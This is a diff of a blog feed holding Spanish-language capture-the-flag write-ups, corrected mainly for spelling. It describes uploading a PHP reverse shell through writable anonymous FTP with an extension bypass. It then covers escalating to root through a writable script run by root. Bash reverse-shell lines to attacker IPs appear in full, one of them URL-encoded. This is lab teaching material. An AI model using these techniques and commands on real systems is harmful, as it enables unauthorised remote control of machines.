@@ -187,8 +187,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;puerto-21-ftp&#34;&gt;Puerto 21 (ftp)&lt;/h2&gt;
-&lt;p&gt;El nmap a reportado que nos podemos conectar por ftp como anonymous. Dentro del ftp hay tres archivos: &lt;code&gt;.test_log&lt;/code&gt;, &lt;code&gt;important.jpg&lt;/code&gt; y &lt;code&gt;notice.txt&lt;/code&gt;. Tambien hay un directorio llamado &lt;code&gt;ftp&lt;/code&gt; en el cual tenemos permisos de escritura.&lt;/p&gt;
-&lt;p&gt;Nos pasamos los tres archivos con &lt;code&gt;get &amp;quot;archivo&amp;quot;&lt;/code&gt; para analizarlos desde nuestra máquina. Ningun archivo continen informacion relevante&lt;/p&gt;
+&lt;p&gt;El nmap ha reportado que nos podemos conectar por ftp como anonymous. Dentro del ftp hay tres archivos: &lt;code&gt;.test_log&lt;/code&gt;, &lt;code&gt;important.jpg&lt;/code&gt; y &lt;code&gt;notice.txt&lt;/code&gt;, también hay un directorio llamado &lt;code&gt;ftp&lt;/code&gt; en el cual tenemos permisos de escritura.&lt;/p&gt;
+&lt;p&gt;Nos pasamos los tres archivos con &lt;code&gt;get &amp;quot;archivo&amp;quot;&lt;/code&gt; para analizarlos desde nuestra máquina. Ningún archivo contienen información relevante&lt;/p&gt;
 &lt;h2 id=&#34;puerto-80-http&#34;&gt;Puerto 80 (http)&lt;/h2&gt;
 &lt;h3 id=&#34;subdirectorios&#34;&gt;Subdirectorios&lt;/h3&gt;
 &lt;p&gt;Empezamos con un escaneo de subdirectorios, vamos a usar dirb&lt;/p&gt;
@@ -200,8 +200,8 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dirb 10.10.76.5
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Nos encuentra el subdirectorio &lt;code&gt;files&lt;/code&gt;. Dentro de files vemos que hay los mismos archivos que en el ftp, teniendo encuenta que en el ftp habia una carpeta en la cual podiamos subir archivos, podemos probar de subir una revers shell con php para despues ejecutarla desde la web.&lt;/p&gt;
-&lt;h2 id=&#34;intrusion&#34;&gt;Intrusion&lt;/h2&gt;
+&lt;/div&gt;&lt;p&gt;Nos encuentra el subdirectorio &lt;code&gt;files&lt;/code&gt;. Dentro de files vemos que hay los mismos archivos que en el ftp, teniendo en cuenta que en el ftp había una carpeta en la cual podíamos subir archivos, podemos probar de subir una reverse shell con php para después ejecutarla desde la web.&lt;/p&gt;
+&lt;h2 id=&#34;intrusión&#34;&gt;Intrusión&lt;/h2&gt;
 &lt;p&gt;Nos bajamos el .php&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -211,10 +211,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Es importante cambiar las lineas de ip y puerto.&lt;/p&gt;
-&lt;p&gt;Como normalmente la extensión .php esta bloqueada lo vamos a cambiar a &lt;code&gt;.phtml&lt;/code&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Es importante cambiar las líneas de ip y puerto.&lt;/p&gt;
+&lt;p&gt;Como normalmente la extensión .php está bloqueada, lo vamos a cambiar a &lt;code&gt;.phtml&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Ahora ya nos podemos volver a conectar por ftp y dentro de la carpeta ftp subir el .phtml con &lt;code&gt;put&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Por ultimo nos ponemos en escucha por el puerto 443 y desde la web ejecutamos el archivo. Ya tenemos la reverse shell&lt;/p&gt;
+&lt;p&gt;Por último nos ponemos en escucha por el puerto 443 y desde la web ejecutamos el archivo. Ya tenemos la reverse shell&lt;/p&gt;
 &lt;h2 id=&#34;tratamiento-de-tty&#34;&gt;Tratamiento de tty&lt;/h2&gt;
 &lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -267,13 +267,13 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;escalda-de-privilegios&#34;&gt;Escalda de privilegios&lt;/h2&gt;
-&lt;h2 id=&#34;lennie&#34;&gt;Lennie&lt;/h2&gt;
+&lt;h3 id=&#34;lennie&#34;&gt;Lennie&lt;/h3&gt;
 &lt;p&gt;En &lt;code&gt;/incidents&lt;/code&gt; vemos un archivo el cual parece que contiene un historial de los comandos que se han ejecutado, buscando un poco vemos un sitio donde salen unas credenciales&amp;hellip;&lt;/p&gt;
-&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
-&lt;p&gt;Con la herramienta pspy podemos ver como se ejecuta automaticamente como root el archivo /home/lennie/scripts/planner.sh.&lt;/p&gt;
-&lt;p&gt;No tenemos permisos de escritura para este archivo, pero ese archivo ejecuta otro archivo: &lt;code&gt;/etc/printf.sh&lt;/code&gt;, en este si que tenemos permisos de escritura.&lt;/p&gt;
-&lt;p&gt;Dentro vamos a poner &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/442 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt; y nos vamos a poner en esucha por el puerto 442.&lt;/p&gt;
-&lt;p&gt;Recibimos la conexión y YA SOMOS ROOT!!!!!&lt;/p&gt;
+&lt;h3 id=&#34;root&#34;&gt;Root&lt;/h3&gt;
+&lt;p&gt;Con la herramienta pspy podemos ver como se ejecuta automáticamente como root el archivo /home/lennie/scripts/planner.sh.&lt;/p&gt;
+&lt;p&gt;No tenemos permisos de escritura para este archivo, pero ese archivo ejecuta otro archivo: &lt;code&gt;/etc/printf.sh&lt;/code&gt;, en este sí que tenemos permisos de escritura.&lt;/p&gt;
+&lt;p&gt;Dentro vamos a poner &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/442 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt; y nos vamos a poner en escucha por el puerto 442.&lt;/p&gt;
+&lt;p&gt;¡Recibimos la conexión y YA SOMOS ROOT!!!!!&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -436,7 +436,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nlvp &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Ahora enviamos con el exploit el comando para mandarnos una revershell &lt;code&gt;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.237%2F443%200%3E%261%22&lt;/code&gt;.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Ahora enviamos con el exploit el comando para mandarnos una reverse shell &lt;code&gt;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.237%2F443%200%3E%261%22&lt;/code&gt;. Y ya somos root&lt;/p&gt;
 </description>
         </item>
         <item>
